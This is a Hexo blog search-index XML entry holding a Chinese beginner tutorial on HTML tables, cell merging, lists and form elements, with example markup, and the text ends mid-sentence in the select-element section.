<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTML_Day2</title>
      <link href="/2025/08/08/HTML-Day2/"/>
      <url>/2025/08/08/HTML-Day2/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML标签（下）"><a href="#HTML标签（下）" class="headerlink" title="HTML标签（下）"></a>HTML标签（下）</h1><h2 id="1-表格"><a href="#1-表格" class="headerlink" title="1. 表格"></a>1. 表格</h2><p>表格是实际开发中非常常用的标签:  </p><ol><li>表格的主要作用 </li><li>表格的基本语法 </li></ol><h3 id="1-1-表格的主要作用"><a href="#1-1-表格的主要作用" class="headerlink" title="1.1 表格的主要作用"></a>1.1 表格的主要作用</h3><p>表格主要用于显示、展示数据，因为它可以让数据显示的非常的规整，可读性非常好。特别是后台展示数据 的时候，能够熟练运用表格就显得很重要。一个清爽简约的表格能够把繁杂的数据表现得很有条理。 </p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title></head><body>    <table>        <tr> <td>支出项目</td> <td>单价（元）</td> <td>数目</td> <td>金额（元）</td></tr>        <tr> <td>垃圾箱</td> <td>30</td> <td>12</td> <td>360</td></tr>        <tr> <td>垃圾牌</td> <td>100</td> <td>12</td> <td>1200</td></tr>        <tr> <td>宣传单</td> <td>0.08（元）</td> <td>400</td> <td>32</td></tr>        <tr> <td>宣传小册子</td> <td>3</td> <td>250</td> <td>750</td></tr>        <tr> <td>合计</td> <td>--</td> <td>--</td> <td>2342</td></tr>    </table></body></html>   ### 1.2 表格的基本用法<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格内的文字<span class="tag">&lt;/<span class="name">td</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>1. `<table> </table> `是用于定义表格的标签。 2. `<tr> </tr>` 标签用于定义表格中的行，必须嵌套在 `<table> </table>`标签中。 3. `<td> </td>` 用于定义表格中的单元格，必须嵌套在`<tr></tr>`标签中。 4. 字母 td 指表格数据（table data），即数据单元格的内容。### 1.3 表头单元格标签一般表头单元格位于表格的第一行或第一列，表头单元格里面的文本内容加粗居中显示.  `<th>`标签表示 HTML 表格的表头部分(table head 的缩写)<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span> </span><br></pre></td></tr></table></figure><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title></head><body>    <table>        <tr><th>姓名</th><th>性别</th><th>电话</th></tr>        <tr><td>小王</td><td>女</td><td>110</td></tr>        <tr><td>姓名</td><td>男</td><td>120</td></tr>    </table></body></html><h3 id="1-4-表格属性"><a href="#1-4-表格属性" class="headerlink" title="1.4 表格属性"></a>1.4 表格属性</h3><p>表格标签这部分属性我们实际开发我们不常用，后面通过 CSS 来设置.  </p><p>目的有2个:    </p><ol><li>记住这些英语单词,后面 CSS 会使用.  </li><li>直观感受表格的外观形态.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E6%A0%BC%E5%B1%9E%E6%80%A7.png" alt="表格属性"></p><p><strong>案例1：小说排行榜</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729190109792.png" alt="image-20250729190109792"></p><p>先制作表格的结构.    </p><ol><li><p>第一行里面是 th 表头单元格  </p></li><li><p>第二行开始里面是 td 普通单元格 </p></li><li><p>单元格里面可以放任何元素,文字链接图片等都可以  </p></li></ol><p>后书写表格属性.  </p><ol><li>用到宽度高度边框cellpadding 和 cellspacing  </li><li>表格浏览器中对齐 align    </li></ol><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title></head><body>    <table align="center" width="500" height="249" border="1" cellspacing="0">        <tr>            <th>排名</th>            <th>关键词</th>            <th>趋势</th>            <th>今日搜索</th>            <th>最近七日</th>            <th>相关链接</th>        </tr>        <tr>            <td>1</td>            <td>鬼吹灯</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/down.jpg"></td>            <td>345</td>            <td>123</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>        <tr>            <td>2</td>            <td>盗墓笔记</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/down.jpg"></td>            <td>124</td>            <td>675432</td>            <td><a href="#">贴吧 </a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>        <tr>            <td>3</td>            <td>西游记</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/up.jpg"></td>            <td>212</td>            <td>7654</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>        <tr>            <td>4</td>            <td>东游记</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/up.jpg"></td>            <td>23</td>            <td>75645</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>         <tr>            <td>5</td>            <td>甄嬛传</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/down.jpg"></td>            <td>121</td>            <td>7676</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>         <tr>            <td>6</td>            <td>水浒传</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/up.jpg"></td>            <td>576576</td>            <td>1231421</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>         <tr>            <td>7</td>            <td>三国演义</td>            <td><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/up.jpg"></td>            <td>234</td>            <td>7686</td>            <td><a href="#">贴吧</a> <a href="#">图片</a> <a href="#">百科</a></td>        </tr>         </table></body></html><h3 id="1-5-表格结构标签"><a href="#1-5-表格结构标签" class="headerlink" title="1.5 表格结构标签"></a>1.5 表格结构标签</h3><p>使用场景:因为表格可能很长,为了更好的表示表格的语义，可以将表格分割成 表格头部和表格主体两大部分.<br>在表格标签中，分别用：<code>&lt;thead&gt;</code>标签 表格的头部区域、<code>&lt;tbody&gt;</code>标签 表格的主体区域. 这样可以更好的分清表格结构。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E6%A0%BC%E7%BB%93%E6%9E%84%E6%A0%87%E7%AD%BE.png" alt="表格结构标签"></p><ol><li><code>&lt;thead&gt;&lt;/thead&gt;</code>：用于定义表格的头部。<code>&lt;thead&gt;</code> 内部必须拥有 <code>&lt;tr&gt;</code> 标签。 一般是位于第一行。 </li><li><code>&lt;tbody&gt;&lt;/tbody&gt;</code>：用于定义表格的主体，主要用于放数据本体 。 </li><li>以上标签都是放在 <code>&lt;table&gt;&lt;/table&gt;</code> 标签中。</li></ol><h3 id="1-6-合并单元格"><a href="#1-6-合并单元格" class="headerlink" title="1.6 合并单元格"></a>1.6 合并单元格</h3><p>特殊情况下,可以把多个单元格合并为一个单元格,  这里同学们会最简单的合并单元格即可.  </p><ol><li>合并单元格方式 </li><li>目标单元格 </li><li>合并单元格的步骤</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC.png" alt="合并单元格"></p><p><strong>合并单元格方式：</strong></p><ul><li>跨行合并：rowspan=”合并单元格的个数”        </li><li>跨列合并：colspan=”合并单元格的个数”</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729201451078.png" alt="image-20250729201451078"></p><p><strong>目标单元格：(写合并代码)</strong>  </p><ul><li>跨行：最上侧单元格为目标单元格, 写合并代码</li><li>跨列：最左侧单元格为目标单元格, 写合并代码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729201654331.png" alt="image-20250729201654331"></p><p><strong>合并单元格三步曲：</strong> </p><ol><li>先确定是跨行还是跨列合并。 </li><li>找到目标单元格. 写上合并方式 = 合并的单元格数量。比如：<code>&lt;td colspan=&quot;2&quot;&gt;&lt;/td&gt;</code>。 </li><li>删除多余的单元格。</li></ol><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>合并单元格</title></head><body>    <table width="500" height="249" border="1" cellspacing="0">        <tr>            <td ></td>            <td colspan="2"></td>             <!-- 合并列 -->             </tr>    <tr>        <td rowspan="2""></td>        <!-- 合并行 -->        <td></td>        <td></td>    </tr>    <tr>        <td "></td>        <td></td>    </tr></table> </body></html><h3 id="1-7-表格总结"><a href="#1-7-表格总结" class="headerlink" title="1.7 表格总结"></a>1.7 表格总结</h3><ol><li>表格的相关标签</li></ol><p>​    我们学习了table 标签  tr 行 标签  td 单元格 标签    th 表头单元格 标签   thead 表格头部区域标签 </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729203055182.png" alt="image-20250729203055182"></p><ol><li>表格的相关属性</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E6%A0%BC%E5%B1%9E%E6%80%A7.png" alt=""></p><ol><li>合并单元格</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729203340412.png" alt="image-20250729203340412"></p><h2 id="2-列表标签"><a href="#2-列表标签" class="headerlink" title="2. 列表标签"></a>2. 列表标签</h2><p>表格是用来显示数据的，那么列表就是用来布局的。   </p><p>列表最大的特点就是整齐、整洁、有序，它作为布局会更加自由和方便。  </p><p>根据使用情景不同，列表可以分为三大类：无序列表、有序列表和自定义列表。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729203431491.png" alt="image-20250729203431491"></p><h3 id="2-1-无序列表（重点）"><a href="#2-1-无序列表（重点）" class="headerlink" title="2.1 无序列表（重点）"></a>2.1 无序列表（重点）</h3><p><code>&lt;ul&gt;</code> 标签表示 HTML 页面中项目的无序列表，一般会以项目符号呈现列表项，而列表项使用 <code>&lt;li&gt;</code> 标签定义。<br>无序列表的基本语法格式如下： </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项1<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项2<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项3<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>无序列表的各个列表项之间没有顺序级别之分，是并列的。 </li><li><code>&lt;ul&gt;&lt;/ul&gt;</code> 中只能嵌套 <code>&lt;li&gt;&lt;/li&gt;</code>，直接在<code>&lt;ul&gt;&lt;/ul&gt;</code> 标签中输入其他标签或者文字的做法是不被允许的。 </li><li><code>&lt;li&gt;</code> 与 <code>&lt;/li&gt;</code> 之间相当于一个容器，可以容纳所有元素。 </li><li>无序列表会带有自己的样式属性，但在实际使用时，我们会使用 CSS 来设置。</li></ol><p>例子如下：</p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>无序列表</title></head><body>    <h4>您喜欢的食物?</h4>    <ul>        <li>榴莲</li>        <li>臭豆腐</li>        <li>鲱鱼罐头</li>        <li>            <p>123</p>        </li>    </ul></body></html><h3 id="2-3-有序列表（理解）"><a href="#2-3-有序列表（理解）" class="headerlink" title="2.3 有序列表（理解）"></a>2.3 有序列表（理解）</h3><p>有序列表即为有排列顺序的列表，其各个列表项会按照一定的顺序排列定义。<br>在 HTML 标签中，<code>&lt;ol&gt;</code> 标签用于定义有序列表，列表排序以数字来显示，并且使用 <code>&lt;li&gt;</code> 标签来定义列表项。<br>有序列表的基本语法格式如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项1<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项2<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>列表项3<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;ol&gt;&lt;/ol&gt;</code>中只能嵌套<code>&lt;li&gt;&lt;/li&gt;</code>，直接在<code>&lt;ol&gt;&lt;/ol&gt;</code>标签中输入其他标签或者文字的做法是不被允许的。 </li><li><code>&lt;li&gt; 与 &lt;/li&gt;</code>之间相当于一个容器，可以容纳所有元素。 </li><li>有序列表会带有自己样式属性，但在实际使用时，我们会使用 CSS 来设置。</li></ol><p>例子如下：</p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>有序列表(理解)</title></head><body>    <h4>粉丝排行榜</h4>    <ol>        <li>刘德华 10000</li>        <li>刘若英 1000</li>        <li>pink老师 1</li>    </ol></body></html><h3 id="2-3-自定义列表（重点）"><a href="#2-3-自定义列表（重点）" class="headerlink" title="2.3 自定义列表（重点）"></a>2.3 自定义列表（重点）</h3><p>自定义列表的使用场景:  </p><p>自定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729204519861.png" alt="image-20250729204519861"></p><p>在 HTML 标签中，<code>&lt;dl&gt;</code> 标签用于定义描述列表（或定义列表），该标签会与 <code>&lt;dt&gt;</code>（定义项目/名字）和 <code>&lt;dd&gt;</code>（描述每一个项目/名字）一起使用。<br>其基本语法如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>名词1<span class="tag">&lt;/<span class="name">dt</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>名词1解释1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>名词1解释2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;dl&gt;&lt;/dl&gt;</code> 里面只能包含 <code>&lt;dt&gt;</code> 和 <code>&lt;dd&gt;</code>。 </li><li><code>&lt;dt&gt;</code> 和 <code>&lt;dd&gt;</code>个数没有限制，经常是一个<code>&lt;dt&gt;</code> 对应多个<code>&lt;dd&gt;</code>。</li><li><code>&lt;dt&gt;</code>和<code>&lt;dd&gt;</code>是并列关系</li></ol><p>例子如下：</p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>自定义列表(重点)</title></head><body>    <dl>        <dt>关注我们</dt>        <dd>新浪微博</dd>        <dd>官方微信</dd>        <dd>联系我们</dd>        <dt>关注我们</dt>        <dd>新浪微博</dd>        <dd>官方微信</dd>        <dd>联系我们</dd>    </dl></body></html><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E7%9A%87%E4%B8%8A.png" alt="皇上"></p><h3 id="2-4-列表总结"><a href="#2-4-列表总结" class="headerlink" title="2.4 列表总结"></a>2.4 列表总结</h3><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%88%97%E8%A1%A8%E6%80%BB%E7%BB%93.png" alt="列表总结"><br><strong>注意：</strong> </p><ol><li>学会什么时候用无序列表， 什么时候用自定义列表。 </li><li>无序列表和自定义列表代码怎么写？ </li><li>列表布局在学习完 CSS 后再来完成。</li></ol><h2 id="3-表单标签"><a href="#3-表单标签" class="headerlink" title="3. 表单标签"></a>3. 表单标签</h2><p>现实中的表单，我们去银行办理信用卡填写的单子。 </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729205318269.png" alt="image-20250729205318269"></p><p>网页中的表单展示</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E5%8D%95.png" alt="表单"></p><p>网页中的表单展示  </p><ol><li>为什么需要表单  </li><li>表单的组成</li></ol><h3 id="3-1-为什么需要表单"><a href="#3-1-为什么需要表单" class="headerlink" title="3.1 为什么需要表单"></a>3.1 为什么需要表单</h3><p>使用表单目的是为了收集用户信息。  </p><p>在我们网页中， 我们也需要跟用户进行交互，收集用户资料，此时就需要表单。</p><h3 id="3-2-表单的组成"><a href="#3-2-表单的组成" class="headerlink" title="3.2 表单的组成"></a>3.2 表单的组成</h3><p>在 HTML 中，一个完整的表单通常由表单域、表单控件（也称为表单元素）和 提示信息3个部分构成。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250729205518407.png" alt="image-20250729205518407"></p><h3 id="3-3-表单域"><a href="#3-3-表单域" class="headerlink" title="3.3 表单域"></a>3.3 表单域</h3><p>表单域是一个包含表单元素的区域。<br>在 HTML 标签中， <code>&lt;form&gt;</code> 标签用于定义表单域，以实现用户信息的收集和传递。<br><code>&lt;form&gt;</code> 会把它范围内的表单元素信息提交给服务器.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">“url地址”</span> <span class="attr">method</span>=<span class="string">“提交方式”</span> <span class="attr">name</span>=<span class="string">“表单域名称</span>&quot;&gt;</span> </span><br><span class="line">各种表单元素控件 </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E5%8D%95%E5%B8%B8%E7%94%A8%E5%B1%9E%E6%80%A7.png" alt="表单常用属性"></p><p>这里只需要记住两点:  </p><ol><li>在我们写表单元素之前,应该有个表单域把他们进行包含. </li><li>表单域是 form标签.</li></ol><h3 id="3-4-表单控件（表单元素）"><a href="#3-4-表单控件（表单元素）" class="headerlink" title="3.4 表单控件（表单元素）"></a>3.4 表单控件（表单元素）</h3><p>在表单域中可以定义各种表单元素，这些表单元素就是允许用户在表单中输入或者选择的内容控件。  接下来我们学习:  </p><ol><li>input输入表单元素 </li><li>select下拉表单元素 </li><li>textarea 文本域元素</li></ol><h4 id="3-4-1-lt-input-gt-表单元素"><a href="#3-4-1-lt-input-gt-表单元素" class="headerlink" title="3.4.1 &lt;input&gt;表单元素"></a>3.4.1 <code>&lt;input&gt;</code>表单元素</h4><p>在英文单词中，input 是输入的意思，而在表单元素中 <code>&lt;input&gt;</code> 标签用于收集用户信息。<br>在 <code>&lt;input&gt;</code> 标签中，包含一个 type 属性，根据不同的 type 属性值，输入字段拥有很多种形式（可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等）。 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;属性值&quot;</span>  /&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;input&gt;</code> 标签为单标签 </li><li>type 属性设置不同的属性值用来指定不同的控件类型</li></ul><p>type 属性的属性值及其描述如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE.png" alt="表单标签"></p><p>除 type 属性外，<code>&lt;input&gt;</code>标签还有其他很多属性，其常用属性如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%A1%A8%E5%8D%95%E5%85%B6%E4%BB%96%E5%B1%9E%E6%80%A7.png" alt="表单其他属性"></p><ol><li>name 和value 是每个表单元素都有的属性值,主要给后台人员使用. </li><li>name 表单元素的名字, 要求 单选按钮和复选框要有相同的name值. </li><li>checked属性主要针对于单选按钮和复选框, 主要作用一打开页面,就要可以默认选中某个表单元素. </li><li>maxlength 是用户可以在表单元素输入的最大字符数, 一般较少使用.</li></ol><p><strong>使用场景：</strong></p><ol><li>有些表单元素想刚打开页面就默认显示几个文字怎么做?  </li></ol><p>​    答: 可以给这些表单元素设置 value 属性=“值” </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;请输入用户名&quot;</span> /&gt;</span> </span><br></pre></td></tr></table></figure><ol><li><p>页面中的表单元素很多，如何区别不同的表单元素? </p><p>答：name 属性：当前 input 表单的名字，后台可以通过这个 name 属性找到这个表单。页面中的表单很多， name 的主要作用就是用于区别不同的表单。 </p></li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;请输入用户名&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>name 属性后面的值，是自定义的</li><li>radio (或者checkbox）如果是一组，我们必须给他们命名相同的名字  </li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span>  /&gt;</span>男 </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> /&gt;</span>女</span><br></pre></td></tr></table></figure><ol><li><p>如果页面一打开就让某个单选按钮或者复选框是选中状态?</p><p>答: checked 属性：表示默认选中状态。用于单选按钮和复选按钮。</p></li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">性    别: </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span> /&gt;</span>男 </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span> /&gt;</span>女 </span><br></pre></td></tr></table></figure><ol><li>如何让input表单元素展示不同的形态? 比如单选按钮或者文本框</li></ol><p>​    答: type属性：type属性可以让input表单元素设置不同的形态.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span> /&gt;</span>男 </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">“请输入用户名”</span>&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>例子如下：</strong></p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>input 表单元素</title></head><body>    <form action="xxx.php" method="get">         <!-- text 文本框 用户可以里面输入任何文字 username是自己选择的名字-->        用户名: <input type="text" name="username" value="请输入用户名" maxlength="6">   <br>         <!-- max是能输入的最多字符 -->        <!-- password 密码框 用户看不见输入的密码 -->        密码: <input type="password" name="pwd" >  <br>         <!-- radio 单选按钮  可以实现多选一 -->        <!-- name 是表单元素名字 这里性别单选按钮必须有相同的名字name 才可以实现多选1 -->        <!-- 单选按钮和复选框可以设置checked 属性, 当页面打开的时候就可以默认选中这个按钮 -->        性别: 男 <input type="radio" name="sex" value="男"> 女  <input type="radio" name="sex" value="女" checked="checked"> 人妖   <input type="radio" name="sex" value="人妖">   <br>         <!-- checkbox 复选框  可以实现多选 -->        爱好: 吃饭 <input type="checkbox" name="hobby" value="吃饭"> 睡觉 <input type="checkbox" name="hobby">  打豆豆 <input type="checkbox" name="hobby" checked="checked">         <br>         <!-- 点击了提交按钮,可以把 表单域 form 里面的表单元素 里面的值 提交给后台服务器 -->        <input type="submit" value="免费注册">        <!-- 重置按钮可以还原表单元素初始的默认状态 -->        <input type="reset" value="重新填写">        <!-- 普通按钮 button  后期结合js 搭配使用-->        <input type="button" value="获取短信验证码"> <br>        <!-- 文件域 使用场景 上传文件使用的 -->        上传头像:  <input type="file" >    </form></body></html><h4 id="3-4-2-lt-label-gt-标签"><a href="#3-4-2-lt-label-gt-标签" class="headerlink" title="3.4.2 &lt;label&gt;标签"></a>3.4.2 <code>&lt;label&gt;</code>标签</h4><p><code>&lt;label&gt;</code> 标签为 input 元素定义标注（标签）。<br><code>&lt;label&gt;</code> 标签用于绑定一个表单元素, 当点击<code>&lt;label&gt;</code> 标签内的文本时，浏览器就会自动将焦点(光标)转到或者<br>选择对应的表单元素上,用来增加用户体验.</p><p><strong>语法：</strong>   </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>核心：<code>&lt;label&gt;</code> 标签的 for 属性应当与相关元素的 id 属性相同。</p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>label标签</title></head><body>   <label for="text"> 用户名:</label> <input type="text" id="text" >   <input type="radio" id="nan" name="sex"> <label for="nan">男</label>   <input type="radio" id="nv"  name="sex"> <label for="nv">女</label></body></html><h4 id="3-4-3-lt-select-gt-表单元素"><a href="#3-4-3-lt-select-gt-表单元素" class="headerlink" title="3.4.3 &lt;select&gt;表单元素"></a>3.4.3 <code>&lt;select&gt;</code>表单元素</h4><p>使用场景: 在页面中，如果有多个选项让用户选择，并且想要节约页面空间时，我们可以使用<code>&lt;select&gt;</code>标签控件定义下<br>拉列表。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E4%B8%8B%E6%8B%89%E5%88%97%E8%A1%A8.png" alt="下拉列表"></p><p><strong>语法：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项1<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项2<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项3<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line">... </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;select&gt;</code> 中至少包含一对<code>&lt;option&gt;</code> 。 </li><li>在<code>&lt;option&gt;</code> 中定义 selected =“ selected “ 